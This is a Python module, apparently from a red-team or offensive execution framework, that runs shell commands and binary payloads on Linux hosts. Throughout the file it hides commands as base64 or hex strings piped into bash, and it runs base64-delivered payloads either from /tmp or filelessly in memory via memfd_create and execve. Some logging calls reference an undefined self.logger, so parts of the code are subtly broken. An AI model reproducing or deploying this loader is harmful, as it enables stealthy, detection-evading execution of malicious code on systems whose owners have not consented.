import subprocess
import platform
import os
import base64
import tempfile
import logging
import stat # For chmod
import uuid
import shlex
from typing import Dict, Any, List, Tuple, Optional
from datetime import datetime
import ctypes
import errno # For checking syscall errors

logger = logging.getLogger(__name__)

# Define memfd_create syscall number (common on x86_64)
# Find dynamically? For now, assume standard number.
# Alternatively, try libc.memfd_create first.
SYS_memfd_create = 319 # Common on x86_64, may vary on other archs

# memfd_create flags
MFD_CLOEXEC = 0x0001 # Close on exec flag

class LinuxExecution:
    """Handles Linux/Unix-like specific command and payload execution."""

    def __init__(self):
        self.config = { # Default config values
            "execution_timeout": 120,
            "default_shell": "bash"
        }
        self.handler_map = {
            "command": self._handle_command_execution,
            "payload": self._handle_payload_execution,
        }
        logger.info("Linux/Unix Execution handler initialized.")

    def update_config(self, config: Dict[str, Any]):
        """Update internal config specific to Linux execution."""
        self.config.update(config)

    def execute(self, exec_type: str, details: Dict[str, Any]) -> Dict[str, Any]:
        """Execute a specific Linux/Unix command or payload technique."""
        handler = self.handler_map.get(exec_type)
        if handler:
            logger.info(f"Executing Linux/Unix {exec_type} request.")
            try:
                result = handler(details)
                result["timestamp"] = datetime.now().isoformat()
                return result
            except Exception as e:
                logger.error(f"Error executing Linux/Unix {exec_type}: {e}", exc_info=True)
                return {"status": "failure", "type": exec_type, "reason": str(e)}
        else:
            logger.warning(f"Unsupported Linux/Unix execution type requested: {exec_type}")
            return {"status": "failure", "type": exec_type, "reason": f"Unsupported execution type '{exec_type}' for Linux/Unix"}

    # --- Internal Helper ---
    def _run_command(self, command: str, shell: Optional[str], use_shell: bool, capture: bool = True) -> Tuple[int, str, str]:
        """Helper to run subprocess commands specifically for Linux/Unix."""
        timeout = self.config.get("execution_timeout", 120)
        effective_shell = shell or self.config.get("default_shell", "bash")

        cmd_list_or_str = command
        if use_shell:
            # Pass command string directly to shell -c
            cmd_list_or_str = [effective_shell, "-c", command]
            use_actual_shell_param = False # subprocess uses list[0] as executable
        else:
            # Use shlex.split for safer arg splitting if not using shell
            try:
                 cmd_list_or_str = shlex.split(command)
                 use_actual_shell_param = False # Pass list directly
            except ValueError as e:
                 logger.warning(f"Could not shlex.split command '{command}': {e}. Using basic split.")
                 cmd_list_or_str = command.split()
                 use_actual_shell_param = False

        logger.info(f"Executing Linux/Unix command (shell={effective_shell if use_shell else 'None'}, use_shell_param={use_actual_shell_param}): {cmd_list_or_str}")

        try:
            process = subprocess.run(cmd_list_or_str,
                                     capture_output=capture,
                                     text=True,
                                     check=False,
                                     timeout=timeout,
                                     encoding='utf-8',
                                     errors='ignore',
                                     shell=use_actual_shell_param # Typically False when passing list
                                     )

            self.logger.debug(f"Command finished. RC: {process.returncode}")
            stdout = process.stdout if process.stdout else ""
            stderr = process.stderr if process.stderr else ""
            return process.returncode, stdout, stderr
        except FileNotFoundError:
            cmd_executed = cmd_list_or_str[0] if isinstance(cmd_list_or_str, list) else command.split()[0]
            logger.error(f"Command or shell not found: {cmd_executed}")
            raise FileNotFoundError(f"Required command/shell '{cmd_executed}' not found.")
        except subprocess.TimeoutExpired:
            logger.error(f"Command timed out after {timeout}s: {command}")
            raise TimeoutError(f"Command '{command}' timed out.")
        except Exception as e:
            logger.error(f"Unexpected error running command '{command}': {e}", exc_info=True)
            raise

    # --- Obfuscation Helper (Linux/Unix specific could be added) ---
    def _apply_obfuscation(self, command: str, method: str, obfuscation_type: Optional[str]) -> Tuple[str, Optional[str]]:
        """Applies Linux/Unix-relevant obfuscation techniques."""
        if not obfuscation_type:
            return command, None

        obfuscated_command = command
        applied_obfuscation = None
        logger.info(f"Applying Linux/Unix obfuscation type '{obfuscation_type}' for method '{method}'")

        if obfuscation_type == "base64":
            # Encode the command and wrap it for shell execution
            try:
                encoded_cmd = base64.b64encode(command.encode('utf-8')).decode('ascii')
                # Wrap for bash/sh: echo '...' | base64 -d | bash
                obfuscated_command = f"echo {encoded_cmd} | base64 -d | {method if method in ['bash', 'sh'] else 'bash'}"
                applied_obfuscation = "base64_shell_pipe"
            except Exception as e:
                logger.warning(f"Base64 encoding for Linux shell failed: {e}. Using original command.")

        elif obfuscation_type == "hex":
            # Encode the command as hex and wrap it (less common, more for specific tools)
            try:
                hex_cmd = command.encode('utf-8').hex()
                # Wrap for bash/sh: printf '\\x...' | bash
                hex_cmd_escaped = "".join([f"\\x{hex_cmd[i:i+2]}" for i in range(0, len(hex_cmd), 2)])
                obfuscated_command = f"printf '{hex_cmd_escaped}' | {method if method in ['bash', 'sh'] else 'bash'}"
                applied_obfuscation = "hex_shell_pipe"
            except Exception as e:
                logger.warning(f"Hex encoding for Linux shell failed: {e}. Using original command.")

        # Add other Linux techniques like string splitting, command substitution, etc.
        else:
            logger.warning(f"Unsupported Linux/Unix obfuscation type requested: '{obfuscation_type}'.")

        if applied_obfuscation:
             logger.info(f"Applied obfuscation '{applied_obfuscation}'. Resulting command starts: {obfuscated_command[:100]}...")
             
        return obfuscated_command, applied_obfuscation

    # --- Command Execution Handler ---
    def _handle_command_execution(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Execute a Linux/Unix shell command."""
        original_command = data.get("cmd")
        method = data.get("method", "direct") # direct, bash
        obfuscation = data.get("obfuscation")
        use_system_shell = data.get("use_shell_api", True if method == "bash" else False) # Default based on method
        capture_output = data.get("capture_output", True)

        if not original_command:
             raise ValueError("Missing 'cmd' in command execution data.")

        command_to_run, applied_obfuscation = self._apply_obfuscation(original_command, method, obfuscation)

        shell_to_use = None
        final_command_arg = command_to_run

        if method == "bash":
             shell_to_use = "bash"
             use_system_shell = True # Use shell -c
        elif method == "direct":
             shell_to_use = None
             use_system_shell = False # Run directly
        else:
            logger.warning(f"Unknown Linux/Unix execution method '{method}', using direct.")
            shell_to_use = None
            use_system_shell = False

        details = {
            "original_command": original_command,
            "command_executed_arg": final_command_arg,
            "obfuscation_requested": obfuscation,
            "obfuscation_applied": applied_obfuscation,
            "execution_method": method,
            "used_system_shell_api": use_system_shell,
            "shell_invoked": shell_to_use,
            "captured_output": capture_output,
            "return_code": -1, "stdout": "", "stderr": ""
        }

        try:
            rc, stdout, stderr = self._run_command(
                final_command_arg,
                shell=shell_to_use,
                use_shell=use_system_shell,
                capture=capture_output
            )
            details["return_code"] = rc
            details["stdout"] = stdout
            details["stderr"] = stderr
            status = "success" if rc == 0 else "failure"
            reason = f"Command failed with return code {rc}." if status == "failure" else "Command executed successfully."

        except Exception as e:
            logger.error(f"_run_command failed for '{original_command}': {e}", exc_info=True)
            status = "failure"
            reason = f"Execution failed: {e}"
            details["stderr"] = reason

        return {
            "status": status,
            "reason": reason,
            "technique": "command_execution",
            "details": details
        }

    # --- Payload Execution Handler ---
    def _handle_payload_execution(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Handles Linux/Unix payload execution via disk or memory (memfd_create)."""
        content_b64 = data.get("content_b64")
        method = data.get("method") # disk, memory
        file_extension = data.get("file_extension", ".elf") # Default to ELF for memory exec
        args = data.get("args", []) # Arguments for the payload
        payload_name_hint = data.get("payload_name", "bluefire_payload") # Name for memfd
        wait_for_child = data.get("wait_for_child", True) # Wait for memfd process?

        if not content_b64 or not method:
            return {"status": "failure", "reason": "Missing content_b64 or method for payload execution."}

        try:
            payload_bytes = base64.b64decode(content_b64)
        except Exception as e:
            return {"status": "failure", "reason": f"Base64 decode error: {e}"}

        status = "failure"
        reason = f"Method '{method}' not implemented or failed."
        result_details = {
            "execution_method": method,
            "payload_size_bytes": len(payload_bytes),
            "args_provided": args,
        }
        if method == "memory":
            result_details["payload_name_hint"] = payload_name_hint
            result_details["wait_for_child"] = wait_for_child

        if method == "disk":
            temp_file_path = None
            try:
                temp_dir = "/tmp"
                if not os.path.isdir(temp_dir) or not os.access(temp_dir, os.W_OK):
                     temp_dir = tempfile.gettempdir()
                     logger.warning(f"/tmp not available, using default temp dir: {temp_dir}")
                
                temp_file_name = f"bf_{uuid.uuid4().hex}{file_extension}"
                temp_file_path = os.path.join(temp_dir, temp_file_name)

                with open(temp_file_path, 'wb') as tmp_file:
                    tmp_file.write(payload_bytes)
                logger.info(f"Payload written to temporary file: {temp_file_path}")

                try:
                    current_st = os.stat(temp_file_path)
                    os.chmod(temp_file_path, current_st.st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
                    logger.info(f"Made temporary file executable: {temp_file_path}")
                except Exception as e_chmod:
                     logger.warning(f"Failed to chmod temporary file {temp_file_path}: {e_chmod}. Execution might fail.")

                command_parts = [temp_file_path] + args
                command_str = " ".join(shlex.quote(part) for part in command_parts)

                return_code, stdout, stderr = self._run_command(command_str, shell=None, use_shell=False, capture=True)

                result_details["temp_file_path"] = temp_file_path
                result_details["command_executed"] = command_str
                result_details["return_code"] = return_code
                result_details["stdout"] = stdout
                result_details["stderr"] = stderr

                if return_code == 0:
                    status = "success"
                    reason = "Payload executed successfully from disk."
                else:
                    reason = f"Payload execution from disk failed. RC: {return_code}. Stderr: {stderr[:200]}..."

            except Exception as e:
                reason = f"Error during disk payload execution: {e}"
            finally:
                if temp_file_path and os.path.exists(temp_file_path):
                    try:
                        os.remove(temp_file_path)
                        logger.info(f"Cleaned up temporary payload file: {temp_file_path}")
                    except Exception as e_clean:
                        logger.warning(f"Failed to cleanup temporary file {temp_file_path}: {e_clean}")

        elif method == "memory":
            self.logger.info(f"Attempting memory execution (memfd_create) for {len(payload_bytes)} byte payload.")
            libc = None
            memfd = -1
            child_pid = -1
            
            try:
                # Try to load libc
                try:
                    libc = ctypes.CDLL("libc.so.6", use_errno=True)
                except OSError as e:
                    raise OSError(f"Failed to load libc.so.6: {e}") from e

                # 1. Create anonymous file descriptor using memfd_create
                # Try direct function first, then syscall fallback
                memfd = -1
                memfd_name = payload_name_hint.encode('utf-8')
                if hasattr(libc, 'memfd_create'):
                    libc.memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]
                    libc.memfd_create.restype = ctypes.c_int
                    memfd = libc.memfd_create(memfd_name, MFD_CLOEXEC)
                else:
                     logger.debug(f"libc.memfd_create not found, trying syscall {SYS_memfd_create}.")
                     libc.syscall.argtypes = [ctypes.c_long, ctypes.c_char_p, ctypes.c_uint]
                     libc.syscall.restype = ctypes.c_int
                     memfd = libc.syscall(SYS_memfd_create, memfd_name, MFD_CLOEXEC)

                if memfd == -1:
                     err = ctypes.get_errno()
                     raise OSError(f"memfd_create failed: {errno.errorcode.get(err, 'Unknown errno')} ({err}) - Kernel might not support it (>= 3.17 required).")
                
                logger.debug(f"Created memfd: {memfd} with name '{payload_name_hint}'")
                result_details["memfd"] = memfd

                # 2. Write payload to memfd
                bytes_written = 0
                offset = 0
                payload_len = len(payload_bytes)
                while offset < payload_len:
                    written = os.write(memfd, payload_bytes[offset:])
                    if written <= 0:
                         raise IOError(f"Failed to write payload to memfd {memfd}. os.write returned {written}.")
                    offset += written
                bytes_written = offset
                logger.debug(f"Wrote {bytes_written} bytes to memfd {memfd}.")
                if bytes_written != payload_len:
                     logger.warning(f"Bytes written ({bytes_written}) does not match payload length ({payload_len}).")

                # 3. Fork process
                child_pid = os.fork()

                if child_pid == 0:
                    # --- Child Process --- 
                    try:
                         # Construct argv for execve (arg0 should be the program name/path)
                         exec_argv = [f"/proc/self/fd/{memfd}"] + args
                         logger.debug(f"Child (PID {os.getpid()}): Executing memfd {memfd} with argv: {exec_argv}")
                         # Execute from the file descriptor
                         os.execve(exec_argv[0], exec_argv, os.environ)
                         # If execve returns, it failed
                         logger.error(f"Child (PID {os.getpid()}): os.execve failed!") 
                         os._exit(127) # Standard exit code for command not found/exec failure
                    except Exception as e_child:
                         logger.error(f"Child (PID {os.getpid()}) error before/during execve: {e_child}", exc_info=True)
                         os._exit(126) # Standard exit code for command invoked cannot execute
                    # -------------------
                
                # --- Parent Process --- 
                logger.info(f"Forked child process PID {child_pid} to execute payload from memfd {memfd}.")
                result_details["child_pid"] = child_pid
                
                # 4. Optionally wait for child
                child_exit_status = None
                if wait_for_child:
                     logger.debug(f"Parent (PID {os.getpid()}): Waiting for child PID {child_pid}...")
                     pid, exit_status = os.waitpid(child_pid, 0)
                     child_exit_status = exit_status
                     result_details["child_exit_status"] = child_exit_status
                     if os.WIFEXITED(exit_status) and os.WEXITSTATUS(exit_status) == 0:
                          logger.info(f"Child process {pid} exited successfully (Status: {exit_status}).")
                          status = "success"
                          reason = f"Payload executed successfully via memfd in child PID {pid}."
                     else:
                          reason = f"Child process {pid} exited with non-zero status: {exit_status}."
                          logger.error(reason)
                          # Keep status as failure if child fails
                else:
                     status = "success"
                     reason = f"Child process {child_pid} created successfully to execute payload from memfd (no wait requested)."
                     logger.info(reason)
                     
            except (OSError, IOError) as e:
                reason = f"Memory execution failed: {e}"
                logger.error(reason, exc_info=True)
                status = "failure"
            except Exception as e:
                reason = f"Unexpected error during memory execution: {e}"
                logger.error(reason, exc_info=True)
                status = "failure"
            finally:
                 # 5. Close memfd in parent
                 if memfd != -1:
                      try:
                           os.close(memfd)
                           logger.debug(f"Closed memfd {memfd} in parent.")
                      except Exception as e_close:
                           logger.warning(f"Failed to close memfd {memfd}: {e_close}")
                           if reason: reason += " | Warning: Failed to close memfd."

        else:
             reason = f"Unsupported payload execution method: {method}"
             status = "failure"

        return {
            "status": status,
            "reason": reason,
            "technique": f"payload_execution_{method}",
            "details": result_details
        } 